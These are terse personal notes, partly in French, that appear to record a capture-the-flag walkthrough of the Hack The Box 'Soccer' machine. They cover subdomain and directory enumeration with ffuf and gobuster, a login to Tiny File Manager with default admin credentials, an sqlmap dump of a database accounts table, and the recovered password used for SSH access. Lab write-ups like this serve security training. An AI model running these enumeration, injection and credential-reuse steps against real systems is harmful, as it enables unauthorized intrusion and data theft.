# ip 10.10.11.194

# find subdomains
ffuf -u http://soccer.htb/ -w ../../../SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host : FUZZ.soccer.htb" | grep 200
ffuf -u http://soccer.htb/ -w ../../../SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host : FUZZ.soccer.htb -fs 178

# enum
gobuster dir -u soccer.htb -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20

# lien 
http://soccer.htb/tiny/tinyfilemanager.php

# faille 
H3k / tiny File Manager 2.4.3

# identifiant
user : admin
pass : admin@123

# etc/hosts
soc-player.soccer.htb

# lien 
http://soc-player.soccer.htb/

# websocket 
ws://soc-player.soccer.htb:9091

# dump tables
sqlmap -u "http://localhost:9091/?id=64767" -T accounts -D soccer_db --dump --batch

# info table accounts
id,email,password,username
1324,player@player.htb,PlayerOftheMatch2022,player

# connection ssh
user : ssh player@10.10.11.194
pass : PlayerOftheMatch2022